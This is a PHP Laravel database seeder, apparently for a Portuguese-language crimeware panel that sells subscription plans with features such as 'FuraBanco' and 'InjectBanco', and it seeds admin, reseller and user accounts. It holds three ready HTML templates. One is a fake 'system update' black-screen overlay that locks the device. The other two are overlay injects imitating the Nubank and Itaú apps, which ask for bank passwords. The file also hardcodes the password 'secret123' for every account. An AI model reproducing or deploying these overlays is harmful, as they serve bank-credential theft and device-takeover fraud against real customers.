<?php

namespace Database\Seeders;

use App\Models\User;
use App\Models\Plan;
use App\Models\Template;
use App\Models\Ranking;
use Illuminate\Database\Seeder;

class DatabaseSeeder extends Seeder
{
    public function run(): void
    {
        $planCortesia = Plan::updateOrCreate(['slug' => 'cortesia-7d'], [
            'name' => 'Cortesia 7 Dias',
            'price' => 0.00,
            'limits' => ['apps' => 15, 'bypass' => 15],
            'features' => ['PlayFake', 'Bypass', 'FuraBanco', 'PuxadaVip', 'ScreenTroll', 'InjectBanco'],
            'active' => true,
        ]);

        $planMensal = Plan::updateOrCreate(['slug' => 'mensal'], [
            'name' => 'Plano Mensal PRO',
            'price' => 149.90,
            'limits' => ['apps' => 100, 'bypass' => 100],
            'features' => ['PlayFake', 'Bypass', 'FuraBanco', 'PuxadaVip', 'ScreenTroll', 'InjectBanco'],
            'active' => true,
        ]);

        $planTrimestral = Plan::updateOrCreate(['slug' => 'trimestral'], [
            'name' => 'Plano Trimestral PRO',
            'price' => 399.90,
            'limits' => ['apps' => 300, 'bypass' => 300],
            'features' => ['PlayFake', 'Bypass', 'FuraBanco', 'PuxadaVip', 'ScreenTroll', 'InjectBanco'],
            'active' => true,
        ]);

        User::updateOrCreate(['email' => 'admin@thevault.com'], [
            'name'                   => 'Admin Vault',
            'password'               => 'secret123',
            'role'                   => 'admin',
            'plan_id'                => $planMensal->id,
            'conta_status'           => 'active',
            'pode_servicos_externos' => true,
            'funcionalidades'        => [
                'play-fake', 'qr-code', 'bypass', 'inject-bancos', 
                'consulta', 'ranking', 'admin', 'users-management', 'settings'
            ],
        ]);

        User::updateOrCreate(['email' => 'rev@thevault.com'], [
            'name'                => 'Revendedor Demo',
            'password'            => 'secret123',
            'role'                => 'revendedor',
            'plan_id'             => $planMensal->id,
            'conta_status'        => 'active',
            'reseller_disponivel' => true,
            'funcionalidades'     => [
                'play-fake', 'qr-code', 'consulta', 'ranking'
            ],
        ]);

        User::updateOrCreate(['email' => 'user@thevault.com'], [
            'name'            => 'luiz77',
            'password'        => 'secret123',
            'role'            => 'user',
            'plan_id'         => $planCortesia->id,
            'funcionalidades' => [
                'play-fake', 'qr-code', 'consulta'
            ],
            'conta_status'    => 'expiring_soon',
            'conta_expira_em' => now()->addDays(3),
        ]);

        // Template 1: Tela Preta Overlay Pro v2
        Template::updateOrCreate(['title' => 'Tela Preta Overlay Pro v2'], [
            'galeria' => 'screen',
            'description' => 'Interface de bloqueio total com animação de atualização do sistema.',
            'html' => '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Atualização de Segurança</title><style>body{background:#0b1120;color:#f8fafc;font-family:system-ui,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;}.spinner{width:48px;height:48px;border:4px solid rgba(255,255,255,0.1);border-top-color:#38bdf8;border-radius:50%;animation:spin 1s linear infinite;}@keyframes spin{to{transform:rotate(360deg);}}h2{margin-top:1.5rem;font-size:1.25rem;font-weight:600;}p{color:#94a3b8;font-size:0.875rem;}</style></head><body><div class="spinner"></div><h2>Instalando atualização do sistema...</h2><p>Não desligue o dispositivo. Este processo pode levar alguns minutos.</p></body></html>',
        ]);

        // Template 2: Inject Nubank 2026
        Template::updateOrCreate(['title' => 'Inject Nubank 2026'], [
            'galeria' => 'inject',
            'description' => 'Tela de captura responsiva estilo aplicativo Nubank.',
            'html' => '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Autenticação de Segurança</title><style>body{background:#820ad1;color:#fff;font-family:system-ui,sans-serif;padding:2rem;margin:0;box-sizing:border-box;}h1{font-size:1.5rem;font-weight:700;margin-bottom:0.5rem;}p{opacity:0.9;font-size:0.9rem;margin-bottom:2rem;}.input-box{width:100%;padding:1rem;border-radius:12px;border:none;font-size:1.2rem;letter-spacing:0.5em;text-align:center;outline:none;background:rgba(255,255,255,0.2);color:#fff;margin-bottom:1.5rem;}.btn{width:100%;padding:1rem;border-radius:100px;border:none;background:#fff;color:#820ad1;font-weight:700;font-size:1rem;cursor:pointer;}</style></head><body><h1>Confirmar Senha</h1><p>Digite sua senha de 4 dígitos para autorizar o acesso.</p><input type="password" maxlength="4" class="input-box" placeholder="••••"><button class="btn">Continuar</button></body></html>',
        ]);

        // Template 3: Inject Itaú 2026
        Template::updateOrCreate(['title' => 'Inject Itaú 2026'], [
            'galeria' => 'inject',
            'description' => 'Tela de autenticação bancária estilo Itaú com teclado numérico.',
            'html' => '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Acesso Itaú</title><style>body{background:#ec7000;color:#fff;font-family:system-ui,sans-serif;padding:2rem;margin:0;box-sizing:border-box;}h1{font-size:1.5rem;font-weight:700;margin-bottom:0.5rem;}p{opacity:0.9;font-size:0.9rem;margin-bottom:2rem;}.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:0.75rem;}.key{aspect-ratio:1;background:rgba(255,255,255,0.15);border:none;border-radius:12px;font-size:1.5rem;font-weight:600;color:#fff;cursor:pointer;}.key:active{background:rgba(255,255,255,0.3);}.key.zero{grid-column:span 2;}.input-display{width:100%;padding:1rem;border-radius:12px;border:none;font-size:1.5rem;letter-spacing:0.5em;text-align:center;outline:none;background:rgba(255,255,255,0.2);color:#fff;margin-bottom:1.5rem;}</style></head><body><h1>Acesso à Conta</h1><p>Digite sua senha eletrônica para continuar.</p><input type="password" readonly class="input-display" placeholder="••••••"><div class="keypad"><button class="key">1</button><button class="key">2</button><button class="key">3</button><button class="key">4</button><button class="key">5</button><button class="key">6</button><button class="key">7</button><button class="key">8</button><button class="key">9</button><button class="key zero">0</button><button class="key">⌫</button></div></body></html>',
        ]);

        // Ranking seeders
        Ranking::updateOrCreate(['user_id' => 3], ['points' => 1250, 'position' => 1]);
        Ranking::updateOrCreate(['user_id' => 2], ['points' => 890, 'position' => 2]);
        Ranking::updateOrCreate(['user_id' => 1], ['points' => 450, 'position' => 3]);
    }
}